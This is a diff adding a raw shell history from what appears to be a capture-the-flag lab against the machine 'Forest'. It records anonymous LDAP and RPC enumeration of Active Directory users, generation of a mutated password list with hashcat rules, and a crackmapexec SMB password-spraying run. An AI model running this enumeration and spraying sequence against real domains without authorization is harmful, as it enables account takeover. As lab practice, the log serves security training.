@@ -1,0 +1,101 @@
+ 1895  nmap -sC -sV -oA forest 10.10.10.161
+ 1896  nslookup 10.10.10.161
+ 1897  ldapsearch -h 10.10.10.161 
+ 1898  ldapsearch
+ 1899  ldapsearch -h
+ 1900  ldapsearch -h 10.10.10.161 -x
+ 1901  ldapsearch -h 10.10.10.161 -x -s base namingcontexts
+ 1902  ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local"
+ 1903  ldapsearch -h 10.10.10.161 -x -s base namingcontexts > ldap-anonymous.out
+ 1904  cat ldap-anonymous.out | grep -i memberof
+ 1905  cat ldap-anonymous.out 
+ 1906  ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" > ldap-anonymous.out 
+ 1907  cat ldap-anonymous.out | grep -i memberof
+ 1908  ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(ObjectClass = Person)'
+ 1909  ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)'
+ 1910  ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' > persons.out
+ 1911  cat persons.out | grep -i displayName
+ 1912  ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' > users.out
+ 1913  cat users.out 
+ 1914  cat users.out  
+ 1915  cat users.out | grep -i displayName:
+ 1916  cat users.out | grep -i displayName
+ 1917  cat users.out | grep -i sAMAccountName
+ 1918  cat users.out | grep -i sAMAccountName | awk '{print $2}'
+ 1919  cat users.out | grep -i sAMAccountName | awk '{print $2}' > userstocrack.txt
+ 1920  nano userstocrack.txt 
+ 1921  wc -l /usr/share/wordlists/rockyou.txt
+ 1922  nano passwordlist.txt
+ 1923  for i in $(cat passwordlist.txt); do echo $i; echo${i}2019, echo${i}2020; done
+ 1924  for i in $(cat passwordlist.txt); do echo $i; echo ${i}2019, echo ${i}2020; done
+ 1925  for i in $(cat passwordlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done
+ 1926  for i in $(cat passwordlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done > passwords.txt
+ 1927  cat password
+ 1928  cat passwords.txt 
+ 1929  wc -l passwords.txt 
+ 1930  hashcat --force --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule 
+ 1931  hashcat --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule 
+ 1932  for i in $(cat passwords.txt); do echo ${i}\!; done > y
+ 1933  cp y passwords.txt 
+ 1934  cat passwords.txt 
+ 1935  hashcat --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule | grep  '!'
+ 1936  hashcat --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule | grep  '!' | wc -l
+ 1937  hashcat --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule| wc -l
+ 1938  hashcat --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | wc -l
+ 1939  hashcat --stdout passwords.txt -r 
+ 1940  cat passwords.txt 
+ 1941  cat passwords.txt  | wc -l
+ 1942  ls
+ 1943  cat passwordlist.txt 
+ 1944  cat passwords.txt 
+ 1945  for i in $(cat passwordlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done > passwords.txt
+ 1946  cat passwords.txt 
+ 1947  ls
+ 1948  for i in $(cat passwords.txt); do echo ${i} ;echo ${i}\!; done > y
+ 1949  cat y
+ 1950  cat y | wc -l 
+ 1951  hashcat --force --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule  | grep '!'
+ 1952  hashcat --force --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule  | grep '!' | wc -l
+ 1953  hashcat --force --stdout y -r /usr/share/hashcat/rules/best64.rule  | grep '!' | wc -l
+ 1954  hashcat --force --stdout y -r /usr/share/hashcat/rules/best64.rule| wc -l
+ 1955  hashcat --force --stdout y -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule| wc -l
+ 1956  hashcat --force --stdout y -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule| sort -u | wc -l
+ 1957  hashcat --force --stdout y -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule| sort -u | awk 'length $0 > 7' | wc -l
+ 1958  hashcat --force --stdout y -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule| sort -u | awk 'length($0) > 7' | wc -l
+ 1959  hashcat --force --stdout y -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule| sort -u | awk 'length($0) > 7' > passwords.txt 
+ 1960  cat passwords.txt 
+ 1961  cat users
+ 1962  cat userstocrack.txt 
+ 1963  apt-get install crackmapexec
+ 1964  crackmapexec smb 10.10.10.161 --pass-pol
+ 1965  crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''
+ 1966  history
+ 1967  clear
+ 1968  crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''
+ 1969  rpcclient -U '' 10.10.10.161
+ 1970  rpcclient -U '' 10.10.10.161 | awk {$2}
+ 1971  rpcclient -U '' 10.10.10.161 
+ 1972  cat userstocrack.txt 
+ 1973  rpcclient -U '' 10.10.10.161 
+ 1974  crackmapexec smb 10.10.10.161 -u userstocrack.txt -p passwords.txt 
+ 1975  crackmapexec
+ 1976  crackmapexec -h
+ 1977  crackmapexec --help
+ 1978  crackmapexec smb 10.10.10.161 -u userstocrack.txt -p passwords.txt -t 200
+ 1979  crackmapexec smb 10.10.10.161 -t 200 -u userstocrack.txt -p passwords.txt 
+ 1980  crackmapexec smb 10.10.10.161 200 -u userstocrack.txt -p passwords.txt 
+ 1981  crackmapexec smb 10.10.10.161-u userstocrack.txt -p passwords.txt 
+ 1982  crackmapexec smb 10.10.10.161 -u userstocrack.txt -p passwords.txt 
+ 1983  crackmapexec -t 200 smb 10.10.10.161 -u userstocrack.txt -p passwords.txt 
+ 1984  ls
+ 1985  git userstocrack.txt
+ 1986  cat userstocrack.txt 
+ 1987  crackmapexec smb 10.10.10.161 -u userstocrack.txt -p passwords.txt 
+ 1988  cat users.out 
+ 1989  cat users.out | grep -i svc
+ 1990  cat persons.out | grep -i displayName
+ 1991  history | grep -i |rpc|
+ 1992  history | grep -i "rpc"
+ 1993  rpcclient -U '' 10.10.10.161
+ 1994  nano userstocrack.txt 
+ 1995  rpcclient -U '' 10.10.10.161
